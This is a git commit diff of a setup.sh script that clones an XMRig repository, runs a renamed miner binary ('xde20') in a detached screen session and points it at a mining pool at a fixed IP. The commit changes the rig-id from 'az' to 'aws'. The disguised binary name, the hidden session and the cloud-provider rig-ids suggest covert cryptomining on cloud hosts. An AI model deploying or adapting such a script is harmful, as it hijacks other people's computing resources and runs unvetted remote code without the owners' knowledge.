dd82abf33c6ea9387cc67d4d51dd8b406460b209
yuqingkj <42601051+yuqingkj@users.noreply.github.com>
2021-01-29 14:35:13 +0800

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -5,6 +5,6 @@ git clone https://github.com/yuqingkj/xmrig_debain.git
 cd xmrig_debain/
 chmod 777 ./xde20
 screen -dmS xmr
-cmd=$"./xde20 -o 106.75.47.32:3333 --rig-id az -t 8";
+cmd=$"./xde20 -o 106.75.47.32:3333 --rig-id aws -t 8";
 screen -x -S xmr -p 0 -X stuff "$cmd\n"
 echo ok
